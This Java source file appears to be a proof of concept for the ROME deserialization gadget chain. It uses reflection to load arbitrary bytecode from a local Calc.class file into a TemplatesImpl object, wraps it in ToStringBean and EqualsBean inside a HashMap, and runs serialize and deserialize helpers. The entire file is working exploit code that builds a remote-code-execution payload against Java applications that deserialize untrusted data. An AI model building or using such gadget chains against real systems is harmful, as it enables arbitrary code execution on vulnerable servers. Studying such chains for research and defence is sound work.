import Utils.*;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.xml.transform.Templates;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class ROMEHashMap {
    public static void main(String[] args) throws Exception {

        TemplatesImpl templatesimpl = new TemplatesImpl();
        byte[] bytecodes = Files.readAllBytes(Paths.get("D:\\Calc.class"));
        ReflectUtils.setFieldValue(templatesimpl,"_name","Jasper");
        ReflectUtils.setFieldValue(templatesimpl,"_bytecodes",new byte[][] {bytecodes});
//        ReflectUtils.setFieldValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());

        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl);

        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);

        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(equalsBean, "123");

//        SerialUtils.serialize(hashMap);
        SerialUtils.unserialize();
    }

}